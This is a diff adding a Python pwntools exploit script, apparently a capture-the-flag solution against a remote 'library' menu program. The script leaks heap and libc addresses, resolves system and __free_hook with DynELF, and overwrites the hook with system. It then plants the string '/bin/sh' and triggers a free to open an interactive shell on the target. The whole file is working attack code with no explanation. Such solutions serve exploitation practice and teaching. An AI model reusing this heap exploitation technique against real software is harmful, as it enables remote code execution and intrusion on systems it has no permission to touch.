@@ -1,0 +1,71 @@
+from pwn import *
+from struct import pack
+debug=0
+if debug:
+    p = process('./library')
+    gdb.attach(p)
+else:
+    p=remote('101.200.187.112','9003')
+def addc(n):
+    p.sendline('1')
+    p.recvuntil(':')
+    p.sendline(str(n))
+    p.recvuntil('$')
+def addbook(c,n):
+    p.sendline('2')
+    p.recvuntil(':')
+    p.sendline(str(c))
+    p.recvuntil(':')
+    p.sendline(str(n))
+    p.recvuntil('$')
+def reset(c,n):
+    p.sendline('6')
+    p.recvuntil(':')
+    p.sendline(str(c))
+    p.recvuntil(':')
+    p.sendline(str(n))
+    p.recvuntil('$')
+def remove(c):
+    p.sendline('4')
+    p.recvuntil(':')
+    p.sendline(str(c))
+    p.recvuntil('$')
+def read(c,n):
+    p.sendline('3')
+    p.sendline(str(c))
+    p.recvuntil(':')
+    p.sendline(str(n))
+    p.recvuntil('Book ID is ')
+    data=int(p.recvuntil("\n"))
+    p.recvuntil('$')
+    return  pack('<Q',data)
+def leak(addr):
+    addbook(0,addr)
+    remove(0)
+    return  read(1,0)
+p.recvuntil('$')
+addc(200)
+reset(0,1)
+addc(200)
+#addbook(1,0x68732f6e69622f)
+n1=u64(read(0,4))
+
+for x in range(3):
+    addbook(0, 0x68732f6e69622f)
+addbook(0,0x31)
+addbook(0,n1)
+addbook(0,0xffffffffffffffff)
+d = DynELF(leak, n1-0x202C90,elf=ELF('./library'))
+system=d.lookup('system','libc')
+hook=d.lookup('__free_hook','libc')
+print '[+] system:'+hex(system)
+print '[+] hook:'+hex(hook)
+addbook(0,hook)
+remove(0)
+remove(0)
+addbook(0,0xffffffff)
+addbook(1,system)
+p.sendline('5')
+p.recvuntil(':')
+p.sendline('0')
+p.interactive()
